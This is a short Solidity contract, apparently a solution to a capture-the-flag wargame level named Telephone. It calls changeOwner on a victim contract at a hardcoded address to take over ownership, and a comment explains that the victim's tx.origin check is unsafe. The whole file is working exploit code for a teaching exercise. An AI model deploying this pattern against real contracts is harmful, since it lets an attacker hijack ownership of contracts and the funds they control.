// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Telephone.sol";

contract TelephoneHack {

  Telephone victim_contract;
  address public owner;

  function hack() public{
    // instance of deployed Telephone contract
    victim_contract = Telephone(0x5FC8d32690cc91D4c39d9d3abcBD16989F875707);
    // use of tx.origin != msg.sender is unsafe as tx.origin returns the address who initated the first transaction
    victim_contract.changeOwner(0xbDA5747bFD65F08deb54cb465eB87D40e51B197E);
  }
}
